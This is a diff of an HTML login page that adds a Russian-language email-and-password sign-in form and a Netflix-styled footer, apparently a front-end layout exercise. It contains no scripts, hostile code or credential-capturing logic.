@@ -13,7 +13,7 @@
     <login>
         <login-wraper>
             <login-background>
-                <img class="login-image" src="/img/main.jpg" alt="">
+                <!--<img class="login-image" src="/img/main.jpg" alt="">-->
             </login-background>
             <login-header>
 
@@ -21,14 +21,48 @@
             <login-body>
                 <div class="body-margin"></div>
                 <div class="login-content">
-
+                    <div class="login-form-main">
+                        <h1 class="login-form-main-title">Авторизация</h1>
+                        <form action="post">
+                            <div class="login-control-container">
+                                <input type="email" placeholder="Введите email" class="login-control">
+                            </div>
+                            <div class="login-control-container">
+                                <input type="password" placeholder="Введите пароль" class="login-control">
+                            </div>
+                            <button class="btn-signIn w-100 btn-login">Войти</button>
+                            <div class="login-footer">
+                                <input type="checkbox" class="custom-checkbox" name="" id="checkLog">
+                                <label class="login-checkbox-label" for="checkLog">Запомнить это устройство</label>
+                            </div>
+                            <div class="login-footer-other"></div>
+                        </form>
+                    </div>
                 </div>
             </login-body>
 
-
-            <login-footer></login-footer>
+            <login-footer>
+                <div style="    -webkit-text-size-adjust: 100%;
+                -webkit-font-smoothing: antialiased;
+                direction: ltr;
+                font-family: Netflix Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif;
+                color: #757575;
+                font-size: 1em;
+                letter-spacing: 0!important;
+                border-top: 1px solid #e5e5e5;
+                height: 0;
+                width: 100%;
+                display: none;
+                border-color: #737373;"></div>
+                <site-footer>
+                    <p class="footer-top"><a class="footer-top-a" href="https://help.netflix.com/contactus">Questions? Contact us.</a></p>
+                </site-footer>
+            </login-footer>
+            
         </login-wraper>
+        
     </login>
+    
 
 </body>
 
